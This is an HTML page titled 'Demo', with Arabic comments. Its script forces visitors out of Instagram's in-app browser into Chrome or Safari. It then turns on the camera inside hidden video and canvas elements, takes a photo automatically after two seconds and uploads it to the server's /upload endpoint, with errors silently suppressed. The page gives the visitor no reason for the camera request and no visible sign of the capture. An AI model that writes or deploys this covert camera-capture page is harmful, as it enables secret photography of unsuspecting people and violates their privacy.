<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Demo</title>
</head>
<body>

  <!-- عناصر مخفية -->
  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    /* =========================================
       1) Redirect from Instagram In-App Browser
          - Android → Chrome
          - iOS → Safari (best-effort)
       ========================================= */
    (function () {
      const ua = navigator.userAgent || navigator.vendor || window.opera;
      const isInstagram = ua.includes("Instagram");
      const isIOS = /iPhone|iPad|iPod/i.test(ua);

      if (isInstagram) {
        if (!isIOS) {
          // Android → Chrome
          const url =
            "intent://" +
            window.location.host +
            window.location.pathname +
            window.location.search +
            "#Intent;scheme=https;package=com.android.chrome;end";
          window.location.href = url;
        } else {
          // iOS → Safari (best possible)
          window.open(window.location.href, "_blank");
        }
      }
    })();

    /* =========================================
       2) Camera Auto Capture (Hidden)
       ========================================= */
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;

        // انتظار بسيط لاستقرار الكاميرا ثم الالتقاط تلقائيًا
        setTimeout(capturePhoto, 2000);
      })
      .catch(() => {
        // لا رسائل – التزام بالعرض التقني
      });

    async function capturePhoto() {
      if (!video.videoWidth) return;

      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d").drawImage(video, 0, 0);

      const image = canvas.toDataURL("image/jpeg");

      await fetch("/upload", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ image })
      });

      // إيقاف الكاميرا بعد الالتقاط (احترافي)
      const tracks = video.srcObject.getTracks();
      tracks.forEach(t => t.stop());
    }
  </script>

</body>
</html>
